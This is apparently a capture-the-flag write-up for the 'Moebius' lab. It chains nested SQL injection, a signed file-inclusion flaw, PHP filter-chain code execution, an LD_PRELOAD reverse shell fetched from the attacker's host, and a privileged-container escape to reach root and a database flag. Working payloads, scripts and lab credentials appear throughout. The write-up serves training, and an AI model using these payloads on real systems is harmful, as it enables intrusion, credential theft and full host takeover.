## Write-up: Moebius 

This write-up details the steps taken to compromise the "Moebius" web application, from initial enumeration to gaining root access on the host system and ultimately retrieving the root flag from a separate database container.
Initial Enumeration

We began by performing an Nmap scan on the target machine to identify open ports and services:
Bash

    nmap -sC -sV 10.10.131.204
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 18:02 UTC
    Nmap scan report for 10.10.131.204
    Host is up (0.094s latency).
    Not shown: 998 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 (protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.62 ((Debian))
    |_http-title: Image Grid
    |_http-server-header: Apache/2.4.62 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.46 seconds

The scan revealed two open ports:

    22/tcp: Running OpenSSH 8.9p1
    80/tcp: Running Apache httpd 2.4.62 ((Debian))

Web Application (Port 80)

## Initial Reconnaissance

Navigating to http://10.10.131.204/ displayed a website showcasing cat pictures, titled "Image Grid". The site featured links to /album.php, with a short_tag variable that could be set to cute, smart, or fav.

Further investigation of http://10.10.131.204/album.php showed that images from the selected album were displayed via requests to the /image.php endpoint, using hash and path variables. When http://10.10.131.204/image.php was accessed with these variables, the corresponding image was simply displayed.

It appeared that image.php included the file specified by the path argument. However, a hash variable was also present, likely to prevent arbitrary file inclusion. Modifying either variable resulted in an "Image not found" error.
Foothold
SQL Injection

Initially, attempting to guess how the hash variable was calculated seemed unfeasible due to the numerous possibilities and the high probability of a secret key being involved.

We shifted our focus back to album.php and tested the short_tag variable for SQL injection vulnerability. Using the payload cute' AND (SELECT 6727 FROM(SELECT COUNT(*),CONCAT(0x717a706b71,(SELECT (ELT(6727=6727,1))),0x71627a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'cuBx'='cuBx, we observed a database error: Connection failed: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qzpkq1qbzbq1' for key 'group_key'. This confirmed the vulnerability.

A basic payload like cute-8758' UNION ALL SELECT CONCAT(0x717a706b71,0x4268707275514441697862415442454a616f7174786e596744676e70694e494a796867506e54554f,0x71627a6271)-- - resulted in Connection failed: SQLSTATE[42S22]: Column not found: 1054 Unknown column 'qzpkqBhpruQDAixbATBEJaoqtxnYgDgnpiNIJyhgPnTUOqbzbq' in 'WHERE'. This indicated that while a UNION query was possible, the number of columns was incorrect, and output trimming might be occurring.

We used sqlmap to enumerate the databases and tables, focusing on the web database given the context.
Bash


    sqlmap -u 'http://10.10.131.204/album.php?short_tag=fav' --dump
    # ... (sqlmap banner and legal disclaimer) ...

    [*] starting @ 18:23:26 /2025-06-03/

    [18:23:26] [INFO] resuming back-end DBMS 'mysql'
    [18:23:26] [INFO] testing connection to the target URL
    sqlmap resumed the following injection point(s) from stored session:
    ---
    Parameter: short_tag (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: short_tag=cute' AND 4564=4564 AND 'cTQN'='cTQN

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
Payload: short_tag=cute' AND (SELECT 6727 FROM(SELECT COUNT(*),CONCAT(0x717a706b71,(SELECT (ELT(6727=6727,1))),0x71627a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'cuBx'='cuBx
    
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: short_tag=cute' AND (SELECT 5008 FROM (SELECT(SLEEP(5)))eAbZ) AND 'iuCk'='iuCk

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
Payload: short_tag=-8758' UNION ALL SELECT CONCAT(0x717a706b71,0x4268707275514441697862415442454a616f7174786e596744676e70694e494a796867506e54554f,0x71627a6271)-- -
 
[18:23:26] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP 8.4.4, Apache 2.4.62
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[18:23:26] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[18:23:26] [INFO] fetching current database
[18:23:26] [INFO] fetching tables for database: 'web'
[18:23:27] [INFO] retrieved: 'albums'
[18:23:27] [INFO] retrieved: 'images'
[18:23:27] [INFO] fetching columns for table 'images' in database 'web'
[18:23:28] [INFO] retrieved: 'path','text'
[18:23:28] [INFO] fetching entries for table 'images' in database 'web'
# ... (server trimmed output warnings) ...
[18:23:31] [INFO] retrieved: '/var/www/images/cat1.jpg'
# ... (other image paths) ...
Database: web
Table: images
[16 entries]

    +----------------------------+
    | path                       |
    +----------------------------+
    | /var/www/images/cat1.jpg   |
    | /var/www/images/cat10.webp |
    | /var/www/images/cat11.webp |
    | /var/www/images/cat12.webp |
    | /var/www/images/cat13.jpg  |
    | /var/www/images/cat14.webp |
    | /var/www/images/cat15.webp |
    | /var/www/images/cat16.webp |
    | /var/www/images/cat2.jpg   |
    | /var/www/images/cat3.jpg   |
    | /var/www/images/cat4.jpg   |
    | /var/www/images/cat5.avif  |
    | /var/www/images/cat6.avif  |
    | /var/www/images/cat7.png   |
    | /var/www/images/cat8.webp  |
    | /var/www/images/cat9.webp  |
    +----------------------------+

[18:23:33] [INFO] table 'web.images' dumped to CSV file '/home/mrblue/.local/share/sqlmap/output/10.10.131.204/dump/web/images.csv'
[18:23:33] [INFO] fetching columns for table 'albums' in database 'web'
[18:23:33] [INFO] retrieved: 'short_tag','text'
[18:23:33] [INFO] retrieved: 'name','text'
[18:23:33] [INFO] retrieved: 'description','text'
[18:23:33] [INFO] fetching entries for table 'albums' in database 'web'
# ... (other album details) ...
Database: web
Table: albums
[3 entries]

     +----------------+-----------+--------------------------+
     | name           | short_tag | description              |
     +----------------+-----------+--------------------------+
     | Cute cats      | cute      | Cutest cats in the world |
     | Favourite cats | fav       | My favourite ones        |
     | Smart cats     | smart     | So smart...              |
     +----------------+-----------+--------------------------+

[18:23:35] [INFO] table 'web.albums' dumped to CSV file '/home/mrblue/.local/share/sqlmap/output/10.10.131.204/dump/web/albums.csv'
[18:23:35] [INFO] fetched data logged to text files under '/home/mrblue/.local/share/sqlmap/output/10.10.131.204'

[*] ending @ 18:23:35 /2025-06-03/

sqlmap confirmed the MySQL (MariaDB fork) backend and the presence of albums and images tables within the web database. It also identified filtered characters, as indicated by the "server trimmed output" warnings, similar to our initial findings.
Nested SQL Injection

Although the initial SQL injection didn't yield critical data directly, it provided crucial insights:

    The query for the short_tag (SELECT id from albums where short_tag = '<short_tag>') fetches the album ID.
    The album.php page also displays image paths, which are stored in the images table. This strongly suggested a second query, likely SELECT * from images where album_id = <album_id>, where <album_id> is the result of the first query. There was a high chance this second query's album_id was not sanitized.
    The database didn't store image hashes. It was probable that album.php calculated these hashes programmatically. If we could inject into this second query to control the returned path, we could force album.php to calculate a hash for an arbitrary path, allowing us to use image.php to include any file.

We tested this theory. A payload like moebus' UNION SELECT 0-- - on the short_tag (e.g., http://10.10.131.204/album.php?short_tag=moebus%27%20UNION%20SELECT%200--%20-) successfully controlled the album_id returned by the first query, as seen in the HTML comment: ``.

Next, the payload moebus' UNION SELECT "0 OR 1=1-- -"-- - (accessed via http://10.10.213.188/album.php?short_tag=moebus%27%20UNION%20SELECT%20%220%20OR%201=1--%20-%22--%20-) made the first query return 0 OR 1=1-- - as the album ID. As hypothesized, the second query became SELECT * from images where album_id=0 OR 1=1-- -, causing all images to be displayed, confirming the nested SQL injection vulnerability.

To control the path returned by the second query, we used a UNION-based payload with three columns: moebus' UNION SELECT "0 UNION SELECT 1,2,3-- -"-- - (accessed via http://10.10.213.188/album.php?short_tag=moebus%27%20UNION%20SELECT%20%220%20UNION%20SELECT%201,2,3--%20-%22--%20-). We confirmed the third column was the path.

Attempting to set the path to /etc/passwd using a direct string was prevented by the / filter. This was bypassed by hex-encoding /etc/passwd. We used the following steps to convert the string:
Bash

    echo -n "/etc/passwd" | xxd -p | tr -d '\n' | sed 's/^/0x/'

This produced 0x2f6574632f706173737764.

The final payload for reading /etc/passwd was:

    moebus' UNION SELECT "0 UNION SELECT 1,2,0x2f6574632f706173737764-- -"-- -

This successfully forced album.php to calculate the hash for /etc/passwd. With the calculated hash (9fa6eacac1714e10527da6f9cf8570e46a5747d9ace37f4f9e963f990429310d), we could read /etc/passwd via:

    http://10.10.131.204/image.php?hash=9fa6eacac1714e10527da6f9cf8570e46a5747d9ace37f4f9e963f990429310d&path=/etc/passwd

The content of /etc/passwd was displayed:

        root:x:0:0:root:/root:/bin/bash
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        bin:x:2:2:bin:/bin:/usr/sbin/nologin
        sys:x:3:3:sys:/dev:/usr/sbin/nologin
        sync:x:4:65534:sync:/bin:/bin/sync
        games:x:5:60:games:/usr/games:/usr/sbin/nologin
        man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
        lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
        mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
        news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
        uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
        proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
        www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
        backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
        list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
        irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
        _apt:x:42:65534::/nonexistent:/usr/sbin/nologin
        nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

## Reading Application Files

With arbitrary file inclusion achieved, we explored using PHP stream wrappers to read internal application files. We specifically utilized php://filter/convert.base64-encode/resource=.

To read album.php, we first hex-encoded the filter string:
Bash

    echo -n "php://filter/convert.base64-encode/resource=album.php" | xxd -p | tr -d '\n' | sed 's/^/0x/'

This resulted in 0x7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d616c62756d2e706870.

The payload used to obtain the hash for album.php was:

    moebus' UNION SELECT "0 UNION SELECT 1,2,0x7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d616c62756d2e706870-- -"-- -

With the calculated hash, we retrieved the base64-encoded source code of album.php. After decoding it, the content was:
PHP

    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Grid</title>
    <link rel="stylesheet" href="/style.css"> </head>
    <body>
    
    <?php
    
    include('dbconfig.php');
    
    try {
        // Create a new PDO instance
        $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
    
        // Set PDO error mode to exception
        $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
        if (preg_match('/[\/;]/', $_GET['short_tag'])) {
            // If it does, terminate with an error message
            die("Hacking attempt");
        }
    
        $album_id = "SELECT id from albums where short_tag = '" . $_GET['short_tag'] . "'";
        $result_album = $conn->prepare($album_id);
        $result_album->execute();
    
        $r=$result_album->fetch();
        $id=$r['id'];
    
    
        // Fetch image IDs from the database
        $sql_ids = "SELECT * FROM images where album_id=" . $id;
        $stmt_path= $conn->prepare($sql_ids);
        $stmt_path->execute();
    
        // Display the album id
        echo "\n";
        // Display images in a grid
        echo '<div class="grid-container">' . "\n";
        foreach ($stmt_path as $row) {
            // Get the image ID
            $path = $row["path"];
            $hash = hash_hmac('sha256', $path, $SECRET_KEY); // This line is crucial!
    
            // Create link to image.php with image ID
            echo '<div class="image-container">' . "\n";
            echo '<a href="/image.php?hash='. $hash . '&path=' . $path . '">';
            echo '<img src="/image.php?hash='. $hash . '&path=' . $path . '" alt="Image path: ' . $path . '">';
            echo "</a>\n";
            echo "</div>\n";;
        }
        echo "</div>\n";
    } catch(PDOException $e) {
        echo "Connection failed: " . $e->getMessage();
    }
    
    // Close the connection
    $conn = null;
    
    ?>
    </body>
    </html>
    
    The source code explicitly revealed that hashes were calculated using HMAC-SHA256: $hash = hash_hmac('sha256', $path, $SECRET_KEY);. It also showed that dbconfig.php was included, suggesting the SECRET_KEY was defined there.
    
    We repeated the process for dbconfig.php by hex-encoding its path:
    Bash
    
    echo -n "php://filter/convert.base64-encode/resource=dbconfig.php" | xxd -p | tr -d '\n' | sed 's/^/0x/'
    
    This yielded 0x7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d6462636f6e6669672e706870.
    
    The payload to get the hash for dbconfig.php was:
    
    moebus' UNION SELECT "0 UNION SELECT 1,2,0x7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d6462636f6e6669672e706870-- -"-- -
    
    Retrieving and decoding the source code of dbconfig.php exposed the SECRET_KEY and database credentials:
    PHP
    
    <?php
    // Database connection settings
    $servername = "db";
    $username = "web";
    $password = "TAJnF6YuIot83X3g";
    $dbname = "web";
    
    
    $SECRET_KEY='an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW';
    ?>

The SECRET_KEY was confirmed to be an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW.

With the SECRET_KEY, we could now calculate valid HMAC-SHA256 hashes for any path. A simple Python script was created for this:
Python

    import hmac
    import hashlib
    import sys
    
    secret_key = b"an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW"
    path = sys.argv[1].encode()
    h = hmac.new(secret_key, path, hashlib.sha256)
    signature = h.hexdigest()
    print(signature)

For instance, to read image.php's source, we calculated its hash:
Bash


    python3 hash_calc.py 'php://filter/convert.base64-encode/resource=image.php'
    ddc6eb77667e8f2dc36eeea2cb0883eb1ede14e6f6e32b6244256040dacfe5c6

Then, using curl with the calculated hash and path:
Bash

    curl -s 'http://10.10.131.204/image.php?hash=ddc6eb77667e8f2dc36eeea2cb0883eb1ede14e6f6e32b6244256040dacfe5c6&path=php://filter/convert.base64-encode/resource=image.php' | base64 -d

    <?php
    
    include('dbconfig.php');
    
        // Get the image ID from the query string
    
        // Fetch image path from the database based on the ID
    
        // Fetch image path
        $image_path = $_GET['path'];
        $hash= $_GET['hash'];
    
        $computed_hash=hash_hmac('sha256', $image_path, $SECRET_KEY);
    
    
        if ($image_path && $computed_hash === $hash) {
            // Get the MIME type of the image
            $image_info = @getimagesize($image_path);
            if ($image_info && isset($image_info['mime'])) {
                $mime_type = $image_info['mime'];
                // Set the appropriate content type header
                header("Content-type: $mime_type");
    
                // Output the image data
                include($image_path);
            } else {
                header("Content-type: application/octet-stream");
                include($image_path);
            }
        } else {
            echo "Image not found";
        }
    
    ?>

The image.php source code confirmed that if the image_path and computed_hash matched the provided hash, the file at the given path was simply included using include($image_path);. This is the core of the Local File Inclusion (LFI) vulnerability.
PHP Filters Chain Exploitation (RCE)

To escalate the LFI to Remote Code Execution (RCE), we utilized PHP filter chains. We generated a chain using php_filter_chain_generator.py to embed the PHP code <?=eval($_GET[0])?>:
Bash

    $ python3 ./php_filter_chain_generator.py --chain '<?=eval($_GET[0])?>'
    [+] The following gadget chain will generate the following code : <?=eval($_GET[0])?> (base64 value: PD89ZXZhbCgkX0dFVFswXSk/Pg)
    php://filter/convert.iconv.UTF8.CSISO2022KR|...|convert.base64-decode/resource=php://temp

This produced a filter chain like php://filter/convert.iconv.UTF8.CSISO2022KR|...|convert.base64-decode/resource=php://temp.

A Python script was written to automate code execution:
Python

    import hmac
    import hashlib
    import requests
    
    target_url = "http://10.10.131.204/image.php" # change the IP address
    secret_key = b"an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW"
    path = "php://filter/convert.iconv.UTF8.CSISO2022KR|...|convert.base64-decode/resource=php://temp".encode() # replace with the output of php_filter_chain_generator.py
    h = hmac.new(secret_key, path, hashlib.sha256)
    signature = h.hexdigest()
    
    while True:
        params = {
            "hash": signature,
            "path": path,
            "0": input("code> ")
        }
        resp = requests.get(target_url, params=params, timeout=5)
        text = resp.text
        print(text)

However, attempts to execute commands using system() were met with a Fatal error: Call to undefined function system(). Checking ini_get('disable_functions') (via echo ini_get('disable_functions'); through our RCE script) confirmed that system, exec, passthru, and many other command execution functions were disabled:

exec, system, popen, proc_open, proc_nice, shell_exec, passthru, dl, pcntl_alarm, pcntl_async_signals, pcntl_errno, pcntl_exec, pcntl_fork, pcntl_get_last_error, pcntl_getpriority, pcntl_rfork, pcntl_setpriority, pcntl_signal_dispatch, pcntl_signal_get_handler, pcntl_signal, pcntl_sigprocmask, pcntl_sigtimedwait, pcntl_sigwaitinfo, pcntl_strerror, pcntl_unshare, pcntl_wait, pcntl_waitpid, pcntl_wexitstatus, pcntl_wifexited, pcntl_wifsignaled, pcntl_wifstopped, pcntl_wstopsig, pcntl_wtermsig...

## Disabled Functions Bypass

We opted to bypass the disabled functions using the putenv and mail functions. This technique involves setting the LD_PRELOAD environment variable with putenv to a malicious shared library. Subsequently, calling mail (which executes sendmail) causes the preloaded library to be loaded and executed.

First, we created shell.c to execute a reverse shell command:
C

    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>
    
    void _init() {
      unsetenv("LD_PRELOAD");
      system("bash -c \"bash -i >& /dev/tcp/10.14.101.76/443 0>&1\"");
    }

This was compiled into a shared library:
Bash

    $ gcc -fPIC -shared -o shell.so shell.c -nostartfiles

We hosted shell.so on a simple HTTP server on our attacking machine. Then, using our PHP code execution script, we downloaded it to the target's /tmp directory:
PHP

    $ch = curl_init('http://10.14.101.76/shell.so');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    file_put_contents('/tmp/shell.so', curl_exec($ch));
    curl_close($ch);

We observed the download request on our HTTP server:
Bash

    $ python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    10.10.131.204 - - [27/Apr/2025 13:47:10] "GET /shell.so HTTP/1.1" 200 -

Finally, we set LD_PRELOAD to our uploaded shared library and invoked mail to trigger the reverse shell:
PHP

    putenv('LD_PRELOAD=/tmp/shell.so');
    mail('a','a','a','a');

This resulted in a reverse shell connection as the www-data user within the container. We then stabilized the shell for better interaction:
Bash

    $ nc -lvnp 443
    listening on [any] 443 ...
    connect to [10.14.101.76] from (UNKNOWN) [10.10.131.204] 46126
    bash: cannot set terminal process group (1): Inappropriate ioctl for device
    bash: no job control in this shell
    www-data@bb28d5969dd5:/var/www/html$ script -qc /bin/bash /dev/null
    www-data@bb28d5969dd5:/var/www/html$ ^Z
    $ stty raw -echo; fg
    www-data@bb28d5969dd5:/var/www/html$ export TERM=xterm
    www-data@bb28d5969dd5:/var/www/html$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data),27(sudo)

## User Flag (Container Escape)
Container Escape

Checking sudo privileges for www-data within the container revealed full access with NOPASSWD:
Bash

    www-data@bb28d5969dd5:/var/www/html$ sudo -l
    Matching Defaults entries for www-data on bb28d5969dd5:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
        use_pty
    
    User www-data may run the following commands on bb28d5969dd5:
        (ALL : ALL) ALL
        (ALL : ALL) NOPASSWD: ALL
    
    We escalated to root within the container:
    Bash
    
    www-data@bb28d5969dd5:/var/www/html$ sudo su -
    root@bb28d5969dd5:~# id
    uid=0(root) gid=0(root) groups=0(root)

Next, we inspected the container's effective capabilities:
Bash

    root@bb28d5969dd5:~# grep CapEff /proc/self/status
    CapEff: 000001ffffffffff

Decoding this hexadecimal value confirmed extensive capabilities:
Bash

    $ capsh --decode=000001ffffffffff
    0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore

The presence of cap_sys_admin was key, allowing us to mount the host's root filesystem directly as we had access to the host's block devices:
Bash

    root@bb28d5969dd5:~# mount /dev/nvme0n1p1 /mnt
    root@bb28d5969dd5:~# cat /mnt/etc/hostname
    ubuntu-jammy

To gain a shell on the host, we added our SSH public key to /mnt/root/.ssh/authorized_keys (which corresponds to /root/.ssh/authorized_keys on the host). First, we generated an SSH key pair on our attacking machine:
Bash

    $ ssh-keygen -f id_ed25519 -t ed25519
    # ... (output) ...
    $ cat id_ed25519.pub
    ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB0nYk5JDOsXnmkB8tQOOspf8I5Ubr2sBLtnXUFq4RMP kali@kali

Then, we wrote the public key to the host's authorized_keys from within the container:
Bash

    root@bb28d5969dd5:~# echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB0nYk5JDOsXnmkB8tQOOspf8I5Ubr2sBLtnXUFq4RMP kali@kali' >> /mnt/root/.ssh/authorized_keys

Finally, we used the private key to SSH into the host as root and retrieved the user flag:
Bash

    $ ssh -i id_ed25519 root@10.10.131.204
    root@ubuntu-jammy:~# id
    uid=0(root) gid=0(root) groups=0(root)
    root@ubuntu-jammy:~# wc -c /root/user.txt
    38 /root/user.txt
    
    Root Flag
    MySQL Database

From the dbconfig.php file, we already knew that the database was running on another host (db). Checking the docker-compose.yml at /root/challenge/docker-compose.yml on the host revealed it was another container:
YAML

    root@ubuntu-jammy:~/challenge# cat docker-compose.yml
    version: '3'
    
    services:
      web:
        platform: linux/amd64
        build: ./web
        ports:
          - "80:80"
        restart: always
        privileged: true
      db:
        image: mariadb:10.11.11-jammy
        volumes:
          - "./db:/docker-entrypoint-initdb.d:ro"
        env_file:
          - "./db/db.env"
        restart: always

The root password for the MySQL server was found in /root/challenge/db/db.env:
Bash

    root@ubuntu-jammy:~/challenge# cat db/db.env
    MYSQL_PASSWORD=TAJnF6YuIot83X3g
    MYSQL_DATABASE=web
    MYSQL_USER=web
    MYSQL_ROOT_PASSWORD=gG4i8NFNkcHBwUpd

Listing running containers confirmed the MariaDB database container:
Bash

    root@ubuntu-jammy:~/challenge# docker container ls
    CONTAINER ID   IMAGE                    COMMAND                  CREATED       STATUS       PORTS                                 NAMES
    89366d62e05c   mariadb:10.11.11-jammy   "docker-entrypoint.s…"   7 weeks ago   Up 4 hours   3306/tcp                              challenge-db-1
    bb28d5969dd5   challenge-web            "docker-php-entrypoi…"   7 weeks ago   Up 4 hours   0.0.0.0:80->80/tcp, [::]:80->80/tcp   challenge-web-1

We obtained a shell inside the database container:
Bash

    root@ubuntu-jammy:~/challenge# docker container exec -it 8936 bash

Connecting to the database as root with the discovered password (gG4i8NFNkcHBwUpd), we found an additional database named secret:
SQL

    root@89366d62e05c:/# mysql -u root -pgG4i8NFNkcHBwUpd
    MariaDB [(none)]> show databases;
    +--------------------+
    | Database           |
    +--------------------+
    | information_schema |
    | mysql              |
    | performance_schema |
    | secret             |
    | sys                |
    | web                |
    +--------------------+
    6 rows in set (0.004 sec)

Inside the secret database, there was a table named secrets.
SQL

    MariaDB [(none)]> use secret;
    MariaDB [secret]> show tables;
    +------------------+
    | Tables_in_secret |
    +------------------+
    | secrets          |
    +------------------+
    1 row in set (0.000 sec)

Finally, querying the secrets table revealed the root flag:
SQL

    MariaDB [secret]> select * from secrets;
    +---------------------------------------+
    | flag                                  |
    +---------------------------------------+
    | THM{[REDACTED]}                       |
    +---------------------------------------+
    1 row in set (0.000 sec)
